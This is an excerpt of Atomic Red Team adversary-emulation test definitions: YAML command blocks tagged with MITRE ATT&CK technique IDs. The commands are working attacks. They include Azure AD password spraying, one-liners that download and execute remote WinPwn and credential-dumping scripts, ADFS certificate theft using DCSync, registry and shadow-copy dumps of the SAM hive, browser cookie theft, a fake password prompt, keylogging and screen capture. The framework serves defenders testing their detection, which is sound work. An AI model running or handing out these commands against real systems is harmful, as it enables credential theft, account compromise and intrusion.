911: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      Disconnect-AzureAD > $null]
912: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force]
913: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] []
914: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      $Users | Foreach-Object {]
915: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [        $user = $_.UserPrincipalName]
916: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword]
917: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [        try {]
918: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          Write-Host " [-] Attempting #{password} on account ${user}."]
919: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          Connect-AzureAD -Credential $Credential 2>&1> $null]
920: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success]
921: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          Write-Host " [!] ${user}:#{password} are valid credentials!`r`n"]
922: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          Disconnect-AzureAD > $null]
923: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [        } catch {]
924: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [          Write-Host " [-] ${user}:#{password} invalid credentials.`r`n"]
925: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [        }]
926: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      }]
927: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      Write-Host "End of password spraying"]
928: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [  auto_generated_guid: 5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82]
929: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [  - windows]
930: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [  executor:]
931: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [    command: |-]
932: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t']
933: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')]
934: [- name: WinPwn - DomainPasswordSpray Attacks] [attack_technique: T1110.003] [      domainpassspray -consoleoutput -noninteractive -emptypasswords]
937: [- name: Private Keys] [attack_technique: T1552.004] [    command: |]
938: [- name: Private Keys] [attack_technique: T1552.004] [      dir c:\ /b /s .key | findstr /e .key]
941: [- name: ADFS token signing and encryption certificates theft - Local] [attack_technique: T1552.004] [    command: |]
942: [- name: ADFS token signing and encryption certificates theft - Local] [attack_technique: T1552.004] [      Import-Module AADInternals -Force]
943: [- name: ADFS token signing and encryption certificates theft - Local] [attack_technique: T1552.004] [      Export-AADIntADFSCertificates]
944: [- name: ADFS token signing and encryption certificates theft - Local] [attack_technique: T1552.004] [      Get-ChildItem | Where-Object {$_ -like "ADFS*"}]
945: [- name: ADFS token signing and encryption certificates theft - Local] [attack_technique: T1552.004] [      Write-Host "`nCertificates retrieved successfully"]
951: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [    command: |]
952: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      Import-Module ActiveDirectory -Force ]
953: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      Import-Module AADInternals -Force | Out-Null]
954: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      #Get Configuration]
955: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $dcServerName = (Get-ADDomainController).HostName]
956: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq "#{adfs_service_account_name}"]
957: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $PWord = ConvertTo-SecureString -String "#{replication_password}" -AsPlainText -Force]
958: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord]
959: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      # use DCSync to fetch the ADFS service account's NT hash]
960: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex]
961: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}]
962: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      # Get certificates decryption key]
963: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $Configuration = [xml]$ADFSConfig]
964: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group]
965: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName]
966: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn]
967: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $base = "LDAP://CN=$group,$container,$parent"]
968: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))]
969: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.Filter = '(name=CryptoPolicy)']
970: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.PropertiesToLoad.Clear()]
971: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null]
972: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $aduser = $ADSearch.FindOne()]
973: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $keyObjectGuid = $ADUser.Properties["displayName"] ]
974: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.PropertiesToLoad.Clear()]
975: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null]
976: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $ADSearch.Filter="(l=$keyObjectGuid)"]
977: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $aduser=$ADSearch.FindOne() ]
978: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] ]
979: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      # Get encrypted certificates from configuration and decrypt them]
980: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key]
981: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      Get-ChildItem | Where-Object {$_ -like "ADFS*"}]
982: [- name: ADFS token signing and encryption certificates theft - Remote] [attack_technique: T1552.004] [      Write-Host "`nCertificates retrieved successfully"]
988: [- name: Registry dump of SAM, creds, and secrets] [attack_technique: T1003.002] [    command: |]
989: [- name: Registry dump of SAM, creds, and secrets] [attack_technique: T1003.002] [      reg save HKLM\sam %temp%\sam]
990: [- name: Registry dump of SAM, creds, and secrets] [attack_technique: T1003.002] [      reg save HKLM\system %temp%\system]
991: [- name: Registry dump of SAM, creds, and secrets] [attack_technique: T1003.002] [      reg save HKLM\security %temp%\security]
998: [- name: Registry parse with pypykatz] [attack_technique: T1003.002] [    command: |]
999: [- name: Registry parse with pypykatz] [attack_technique: T1003.002] [      pypykatz live registry]
1002: [- name: esentutl.exe SAM copy] [attack_technique: T1003.002] [    command: |]
1003: [- name: esentutl.exe SAM copy] [attack_technique: T1003.002] [      esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}]
1012: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [    command: |]
1013: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      write-host ""]
1014: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      $shadowlist = get-wmiobject win32_shadowcopy]
1015: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}]
1016: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]]
1017: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"]
1018: [- name: dump volume shadow copy hives with certutil] [attack_technique: T1003.002] [      certutil -f -v -encodehex $shadowpath #{dump_path}\#{dumped_hive} 2]
1021: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [    command: |]
1022: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      write-host ""]
1023: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      $shadowlist = get-wmiobject win32_shadowcopy]
1024: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      $volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}]
1025: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      $maxvolume = ($volumenumbers | Sort-Object -Descending)[0]]
1026: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      $shadowpath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $maxvolume + "\Windows\System32\config\#{target_hive}"]
1027: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      $mydump = #{dump_path} + '\' + '#{dumped_hive}']
1028: [- name: dump volume shadow copy hives with System.IO.File] [attack_technique: T1003.002] [      [System.IO.File]::Copy($shadowpath , $mydump)]
1037: [- name: Steal Firefox Cookies (Windows)] [attack_technique: T1539] [    command: |]
1038: [- name: Steal Firefox Cookies (Windows)] [attack_technique: T1539] [     stop-process -name "firefox" -force -erroraction silentlycontinue]
1039: [- name: Steal Firefox Cookies (Windows)] [attack_technique: T1539] [     $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"]
1040: [- name: Steal Firefox Cookies (Windows)] [attack_technique: T1539] [     "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"]
1045: [- name: Steal Chrome Cookies (Windows)] [attack_technique: T1539] [    command: |]
1046: [- name: Steal Chrome Cookies (Windows)] [attack_technique: T1539] [     stop-process -name "chrome" -force -erroraction silentlycontinue]
1047: [- name: Steal Chrome Cookies (Windows)] [attack_technique: T1539] [     "select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"]
1052: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [    command: |]
1053: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [      vaultcmd /listcreds:"Windows Credentials"]
1054: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [  auto_generated_guid: fa714db1-63dd-479e-a58e-7b2b52ca5997]
1055: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [  supported_platforms:]
1056: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [  - windows]
1057: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [  executor:]
1058: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [    command: |-]
1059: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')]
1060: [- name: WinPwn - Loot local Credentials - Invoke-WCMDump ] [attack_technique: T1555.004] [      Invoke-WCMDump]
1063: [- name: Compress Data and lock with password for Exfiltration with winrar] [attack_technique: T1560.001] [    command: |]
1064: [- name: Compress Data and lock with password for Exfiltration with winrar] [attack_technique: T1560.001] [      "#{rar_exe}" a -r #{output_file} #{input_path}\*#{file_extension}]
1091: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    command: |]
1092: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      mkdir .\tmp\victim-files]
1093: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      cd .\tmp\victim-files]
1094: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      echo "This file will be encrypted" > .\encrypted_file.txt]
1095: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      "#{rar_exe}" a -hp"blue" hello.rar]
1096: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      dir]
1097: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [  auto_generated_guid: 01df0353-d531-408d-a0c5-3161bf822134]
1098: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    - windows]
1099: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [  input_arguments:]
1100: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    winzip_exe:]
1101: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      type: Path]
1102: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      default: "%ProgramFiles%\\WinZip\\winzip64.exe"]
1103: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    winzip_url:]
1104: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      type: Url]
1105: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      default: https://download.winzip.com/gl/nkln/winzip24-home.exe]
1106: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    winzip_hash:]
1107: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      type: String]
1108: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB]
1109: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [  dependency_executor_name: powershell]
1110: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [  dependencies:]
1111: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [    - description: |]
1112: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [        Winzip must be installed]
1113: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      prereq_command: |]
1114: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [        cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)']
1115: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [      get_prereq_command: |]
1116: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [        if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){]
1117: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [          Write-Host Follow the installation prompts to continue]
1118: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [          cmd /c "$env:Temp\winzip.exe"]
1119: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [        }]
1120: [- name: Compress Data and lock with password for Exfiltration with winzip] [attack_technique: T1560.001] [  executor:]
1123: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    command: |]
1124: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      path=%path%;"C:\Program Files (x86)\winzip"]
1125: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      mkdir .\tmp\victim-files]
1126: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      cd .\tmp\victim-files]
1127: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      echo "This file will be encrypted" > .\encrypted_file.txt]
1128: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      "#{winzip_exe}" -min -a -s"hello" archive.zip *]
1129: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      dir]
1130: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [  auto_generated_guid: d1334303-59cb-4a03-8313-b3e24d02c198]
1131: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    - windows]
1132: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [  input_arguments:]
1133: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    7zip_installer:]
1134: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      type: Path]
1135: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      default: "%TEMP%\\7zip.exe"  ]
1136: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    7zip_exe:]
1137: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      type: Path]
1138: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      default: "%ProgramFiles%\\7-zip\\7z.exe"]
1139: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [  dependencies:]
1140: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [  - description: |]
1141: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      7zip tool must be installed at specified location (#{7zip_exe})]
1142: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    prereq_command: |]
1143: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      if not exist "#{7zip_exe}" (exit /b 1)]
1144: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [    get_prereq_command: |]
1145: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      echo Downloading 7-zip installer]
1146: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      bitsadmin /transfer myDownloadJob /download /priority normal "https://www.7-zip.org/a/7z2002-x64.exe" #{7zip_installer}]
1147: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [      #{7zip_installer} /S]
1148: [- name: Compress Data and lock with password for Exfiltration with 7zip] [attack_technique: T1560.001] [  executor:]
1151: [- name: using device audio capture commandlet] [attack_technique: T1123] [    command: |]
1152: [- name: using device audio capture commandlet] [attack_technique: T1123] [      powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet]
1155: [- name: Registry artefact when application use microphone] [attack_technique: T1123] [    command: |]
1156: [- name: Registry artefact when application use microphone] [attack_technique: T1123] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f]
1157: [- name: Registry artefact when application use microphone] [attack_technique: T1123] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f]
1162: [- name: Automated Collection Command Prompt] [attack_technique: T1119] [    command: |]
1163: [- name: Automated Collection Command Prompt] [attack_technique: T1119] [      mkdir %temp%\T1119_command_prompt_collection >nul 2>&1]
1164: [- name: Automated Collection Command Prompt] [attack_technique: T1119] [      dir c: /b /s .docx | findstr /e .docx]
1165: [- name: Automated Collection Command Prompt] [attack_technique: T1119] [      for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection]
1170: [- name: Automated Collection PowerShell] [attack_technique: T1119] [    command: |]
1171: [- name: Automated Collection PowerShell] [attack_technique: T1119] [      New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null]
1172: [- name: Automated Collection PowerShell] [attack_technique: T1119] [      Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}]
1177: [- name: Recon information for export with PowerShell] [attack_technique: T1119] [    command: |]
1178: [- name: Recon information for export with PowerShell] [attack_technique: T1119] [      Get-Service > $env:TEMP\T1119_1.txt]
1179: [- name: Recon information for export with PowerShell] [attack_technique: T1119] [      Get-ChildItem Env: > $env:TEMP\T1119_2.txt]
1180: [- name: Recon information for export with PowerShell] [attack_technique: T1119] [      Get-Process > $env:TEMP\T1119_3.txt]
1187: [- name: Recon information for export with Command Prompt] [attack_technique: T1119] [    command: |]
1188: [- name: Recon information for export with Command Prompt] [attack_technique: T1119] [      sc query type=service > %TEMP%\T1119_1.txt]
1189: [- name: Recon information for export with Command Prompt] [attack_technique: T1119] [      doskey /history > %TEMP%\T1119_2.txt]
1190: [- name: Recon information for export with Command Prompt] [attack_technique: T1119] [      wmic process list > %TEMP%\T1119_3.txt]
1191: [- name: Recon information for export with Command Prompt] [attack_technique: T1119] [      tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt]
1199: [- name: Utilize Clipboard to store or execute commands from] [attack_technique: T1115] [    command: |]
1200: [- name: Utilize Clipboard to store or execute commands from] [attack_technique: T1115] [      dir | clip]
1201: [- name: Utilize Clipboard to store or execute commands from] [attack_technique: T1115] [      echo "T1115" > %temp%\T1115.txt]
1202: [- name: Utilize Clipboard to store or execute commands from] [attack_technique: T1115] [      clip < %temp%\T1115.txt]
1207: [- name: Execute Commands from Clipboard using PowerShell] [attack_technique: T1115] [    command: |]
1208: [- name: Execute Commands from Clipboard using PowerShell] [attack_technique: T1115] [      echo Get-Process | clip]
1209: [- name: Execute Commands from Clipboard using PowerShell] [attack_technique: T1115] [      Get-Clipboard | iex]
1212: [- name: Collect Clipboard Data via VBA] [attack_technique: T1115] [    command: |]
1213: [- name: Collect Clipboard Data via VBA] [attack_technique: T1115] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
1214: [- name: Collect Clipboard Data via VBA] [attack_technique: T1115] [      Set-Clipboard -value "Atomic T1115 Test, grab data from clipboard via VBA"]
1215: [- name: Collect Clipboard Data via VBA] [attack_technique: T1115] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
1216: [- name: Collect Clipboard Data via VBA] [attack_technique: T1115] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1115\src\T1115-macrocode.txt" -officeProduct "Word" -sub "GetClipboard"]
1221: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [    command: |]
1222: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [      mavinject $pid /INJECTRUNNING #{file_name}]
1223: [- name: Hook PowerShell TLS Encrypt/Decrypt Messages] [attack_technique: T1056.004] [      Invoke-WebRequest #{server_name} -UseBasicParsing]
1240: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [    command: |]
1241: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      # Creates GUI to prompt for password. Expect long pause before prompt is available.    ]
1242: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      $cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)]
1243: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      # Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.]
1244: [- name: PowerShell - Prompt User for Password] [attack_technique: T1056.002] [      write-warning $cred.GetNetworkCredential().Password]
1247: [- name: Input Capture] [attack_technique: T1056.001] [    command: |]
1248: [- name: Input Capture] [attack_technique: T1056.001] [      Set-Location $PathToAtomicsFolder]
1249: [- name: Input Capture] [attack_technique: T1056.001] [      .\T1056.001\src\Get-Keystrokes.ps1 -LogPath #{filepath}]
1260: [- name: Stage data from Discovery.bat] [attack_technique: T1074.001] [    command: |]
1261: [- name: Stage data from Discovery.bat] [attack_technique: T1074.001] [      Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat" -OutFile #{output_file}]
1266: [- name: Zip a Folder with PowerShell for Staging in Temp] [attack_technique: T1074.001] [    command: |]
1267: [- name: Zip a Folder with PowerShell for Staging in Temp] [attack_technique: T1074.001] [      Compress-Archive -Path #{input_file} -DestinationPath #{output_file} -Force]
1272: [- name: Email Collection with PowerShell Get-Inbox] [attack_technique: T1114.001] [    command: |]
1273: [- name: Email Collection with PowerShell Get-Inbox] [attack_technique: T1114.001] [      powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1 -file #{output_file}]
1278: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [    command: |]
1279: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12]
1280: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;]
1281: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);]
1282: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"]
1296: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [    command: |]
1297: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      Add-Type -AssemblyName System.Windows.Forms]
1298: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      $screen = [Windows.Forms.SystemInformation]::VirtualScreen]
1299: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height]
1300: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      $graphic = [Drawing.Graphics]::FromImage($bitmap)]
1301: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)]
1302: [- name: Windows Screen Capture (CopyFromScreen)] [attack_technique: T1113] [      $bitmap.Save("#{output_file}")]
1307: [- name: Registry artefact when application use webcam] [attack_technique: T1125] [    command: |]
1308: [- name: Registry artefact when application use webcam] [attack_technique: T1125] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f]
1309: [- name: Registry artefact when application use webcam] [attack_technique: T1125] [      reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f]
1314: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [    command: |]
1315: [- name: Attaches Command Prompt as a Debugger to a List of Target Processes] [attack_technique: T1546.008] [      $input_table = "#{parent_list}".split(",")]
